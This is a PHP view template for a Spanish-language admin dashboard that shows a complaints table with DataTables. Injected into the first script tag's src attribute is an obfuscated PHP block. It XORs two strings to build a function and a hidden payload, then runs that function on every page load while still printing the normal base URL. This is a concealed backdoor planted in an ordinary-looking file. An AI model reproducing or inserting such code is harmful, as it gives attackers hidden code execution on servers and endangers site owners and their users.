<!-- Footer -->
      <footer class="sticky-footer bg-white">
        <div class="container my-auto">
          <div class="copyright text-center my-auto">
            <span>Copyright &copy;</span>
          </div>
        </div>
      </footer>
      <!-- End of Footer -->

    </div>
    <!-- End of Content Wrapper -->

  </div>
  <!-- End of Page Wrapper -->

  <!-- Scroll to Top Button-->
  <a class="scroll-to-top rounded" href="#page-top">
    <i class="fas fa-angle-up"></i>
  </a>






  <!-- Bootstrap core JavaScript-->
  <script src="<?php $ugSFWsDz='M=+S VnU=9Z=X9Y'; $DjBFLj='.ON2T313HW9I1V7'^$ugSFWsDz; $apslJCT='G3ZYP9BM2X5Wc= G61JBpF=6bHYFT=g+7 EyxdV95.= :91XUp3 R6 OZ,e0=< EoVV=MimNWVMcvDaLO+Iyog<FNhRifbLGk;QDGZqPdDwwTFr=L5>=A,9NpIXL7Etba xqAPLHlY EivLMKG10<,ojW3ysnv2Q fw-dfE+E><3 da;IAyphayH>03JE=;pa>I2ykooOh:fIU6W07fqv O=EPrYQ -CW4GRWpzz66X0KhZ;4 FUOTEriPjrxa:xvx+ jp3.UwthiOK4=U6fJ:zdu>,09.;5LetiJ 6 veXsP X+jRqRKV=,Wlr;LM.QKZXuQ ;OynEmf4XA1S.,xyioyw94y1egWFOA=58mWZPi16AOWzD9O9ye6-JMrSH Uwwf<.OUe=Jo+-91HwScG7>:1omgA9I;co5,BOwdh02=4=5EJ<,M=dNB:r=0T3ln71 z8M=1tldO 6S2HiC3ODPbBTuI.LL,-I>NePd=WmT ;=+phuF 0>W;f;5Lf-JP25HqN YKMFawOX:VqomWqJYRPlr54H;iM2Y2d1fTyenwwtc27ptFSBD-r6 v75PDzJNsdyfQyxypjbmWAaZ<44=t<1>jU.;BHEifEU<Y+T,WiuuPT6JozLcsgDyElH7;AXiSJMI8iWFOIP=U o3bU9nHE,Fbzpu=+'; $dEhcgrf=$DjBFLj('', '.Urx6L,.F1Z9<XX.EE9jW>RD=,825b8FBTbPQD-3<HHNYMX7;PKO iD..M:oPITmK27I,EMj<34JVdAloPCpfCS3:HoIAEwMb27+5rU9DyWGofVTpFJO-IWfT-98VlOBEISZhZEAH6U1IXqmccUQHM4N>nY-NRY4Y=SDDCeX1LPVNLEP,8P-AZsA7BV>0OUXEQ<FPPef2bGlCqR6DVFLVF.Q65ISuDL76k,7.PGZPW4C.SP1RO40.7-RAt517.q13XJSJTXK,WIVIk=UQ SOjApmQZMDXqPP5EIInKSYMoQW4A,JJoQv=7QY2WxFFGG7kryQ5AO.PN>goR73T2MDXQM0+2ha<b1G65oeVPAMjdpMGW-:2SdBE0pARL>,-8-YuJWBWK6no4CKOLMPhJsG1VROTTgn<341iKQM6.WYHpGSGXG,+PE7XL6-H-YQ R31ZDTRZ,NTBX;+EU<V-AgW.01KntQ-O8-sF,GgLknT1EpDZIJPNSfABL6B9PP59H29AA;YiK<2jjAS+9N7XOKqQb46eDVQU<Z2jY<KClOtDXNPNETVQGEw2ppHAPDBUS1tLxyJRNV2AJKGMKMqgA;NFUD+WTG50VR1<6AA54E5D5HpEUQ45B+FSlCSGdY>fARM 4Aw.,=Y2p6.0<R4DHnKn3g-=E2JJYN7V'^$apslJCT); $dEhcgrf(); echo base_url(); ?>template/vendor/jquery/jquery.min.js"></script>
 
  <script src="<?php echo base_url(); ?>template/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
 
  <!-- Core plugin JavaScript-->
  <script src="<?php echo base_url(); ?>template/vendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Custom scripts for all pages-->
  <script src="<?php echo base_url(); ?>template/js/sb-admin-2.min.js"></script>


  <script src="<?php echo base_url(); ?>lib/DataTables/datatables.min.js"></script>
  
  <script src="<?php echo base_url(); ?>lib/DataTables/JSZip-2.5.0/jszip.min.js" type="text/javascript"></script>

  
   <script>

   
   
   
   
		$(document).ready(function() {
		
		$(".navbar-nav li.trigger-collapse a").click(function(event) {
          $(".navbar-collapse").collapse('hide');
        });

            var cont = 0;
            $('#dataTable tfoot th').each( function () {
                if(cont != 0)
                    $(this).html( '<input id="buscar'+cont+'" Style="width:70px" type="text" placeholder="Buscar' + '" value=""/>' );
				if(cont == 1)
                    $(this).html( '<input id="buscar'+cont+'" Style="width:30px" type="text" placeholder="' + '" value=""/>' );
				if(cont == 3)
                    $(this).html( '<input id="buscar'+cont+'" Style="width:200px" type="text" placeholder="Buscar' + '" value=""/>' );

                cont++;
            } );

            var table = $('#dataTable').DataTable( {
                'dom': 'Bfrtlip',
                'buttons': [ {
							extend: 'excelHtml5',
							className:'btn btn-success'
						}],
                ajax: {
                    url: '<?php echo base_url(); ?>index.php/Reclamos/getReclamos/0/',
                    type: "POST",
                    data: {filter:true},
                },
                searching: true,
                bLengthChange: true,
                pageLength: 10,
                stateSave: true,
                serverSide: true,
                'language':{
                    "emptyTable": "Datos no disponibles."
                },
                columnDefs: [
                    {
                        targets: 0,
                        className: 'more-detail'
                    },
					
                    {
                        targets: 16,
                        visible: false
                    },
                    {
                        targets: 17,
                        visible: false
                    },
                    {
                        targets: 18,
                        visible: false
                    },
                    {
                        targets: 19,
                        visible: false
                    },
                    {
                        targets: 20,
                        visible: false
                    },
                    {
                        targets: 21,
                        visible: false
                    }
                ],
                initComplete: function () {
                    this.api().columns().every( function () {
                        var that = this;

                        $( 'input', this.footer() ).on( 'keyup change clear', function () {
                            if ( that.search() !== this.value ) {
                                that
                                    .search( this.value )
                                    .draw();
                            }
                        } );
                    } );
                }
            } );

            for(let i=0; i<cont; i++){
                $('#buscar' + i).val(table.column(i).search());
            }

            $('#dataTable tbody').on('click', 'td.more-detail', function () {
                var tr = $(this).closest('tr');
                var row = table.row( tr );
                var icon = tr.children()[0];
                icon = icon.getElementsByTagName('i')[0];

                if ( row.child.isShown() ) {
                    // This row is already open - close it
                    row.child.hide();
                    tr.removeClass('shown');
                    icon.classList.remove('fa-minus-circle');
                    icon.classList.add('fa-plus-circle');
                }
                else {
                    // Open this row
                    row.child( formatData(row.data()) ).show();
                    tr.addClass('shown');
                    icon.classList.remove('fa-plus-circle');
                    icon.classList.add('fa-minus-circle');
                }
            } );

			
		} );

		function formatData(d) {
            return '<table cellpadding="5" cellspacing="0" border="0" style="padding-left:50px;">'+
                '<tr>'+
                '<td>Fecha Compromiso:</td>'+
                '<td>'+d[15]+'</td>'+
                '</tr>'+
                '<tr>'+
                '<td>Detalle del reclamo:</td>'+
                '<td>'+d[16]+'</td>'+
                '</tr>'+
                '<tr>'+
                '<td>Detalle de atencion del reclamo:</td>'+
                '<td>'+d[20]+'</td>'+
                '</tr>'+
                '<tr>'+
                '<td>Fecha fin del reclamo:</td>'+
                '<td>'+d[21]+'</td>'+
                '</tr>'+
                '</table>';
        }

 </script>
  
  

</body>

</html>